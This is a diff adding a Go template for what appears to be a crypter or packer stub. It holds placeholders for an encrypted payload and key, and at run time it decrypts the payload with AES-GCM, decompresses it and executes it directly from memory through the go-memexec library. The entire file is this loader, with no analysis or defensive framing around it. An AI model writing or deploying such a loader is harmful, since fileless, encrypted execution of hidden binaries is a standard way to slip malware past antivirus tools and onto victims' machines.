@@ -1,0 +1,77 @@
+package main
+
+import (
+	"bytes"
+	"compress/zlib"
+	"crypto/aes"
+	"crypto/cipher"
+	"fmt"
+	"github.com/amenzhinsky/go-memexec"
+	"io/ioutil"
+)
+
+
+func decompress(plaintext []byte) []byte {
+
+	fmt.Printf("Decompressing\n")
+
+	rdata := bytes.NewReader(plaintext)
+	r,_ :=zlib.NewReader(rdata)
+	dataString, _ := ioutil.ReadAll(r)
+
+	return dataString
+
+}
+
+func decrypt(key, encryptedString []byte) []byte {
+
+	fmt.Printf("Decrypting\n")
+
+	ciphertext := encryptedString
+
+	c, err := aes.NewCipher(key)
+	if err != nil {	fmt.Println(err)}
+
+	gcm, err := cipher.NewGCM(c)
+	if err != nil {	fmt.Println(err)}
+
+	nonceSize := gcm.NonceSize()
+	if len(encryptedString) < nonceSize {fmt.Println(err)}
+
+	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
+	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
+	if err != nil {	fmt.Println(err)}
+
+	return plaintext
+
+}
+
+func run(executable []byte) {
+
+	exe, err := memexec.New(executable)
+	if err != nil {
+		fmt.Println("[-] memexec.New() Error: ", err)
+	}
+	defer exe.Close()
+
+	cmd := exe.Command()
+	b, err := cmd.CombinedOutput()
+	if err != nil {
+		fmt.Println("[-] cmd.CombinedOutput() Error: ", err)
+	}
+	fmt.Println(string(b))
+
+}
+
+func main() {
+
+	var ds =  []byte{ {{.DataString}} }
+
+	var key = []byte{ {{.Key}} }
+
+	decrypted := decrypt(key, ds)
+	decompressed := decompress(decrypted)
+
+	run(decompressed)
+
+}
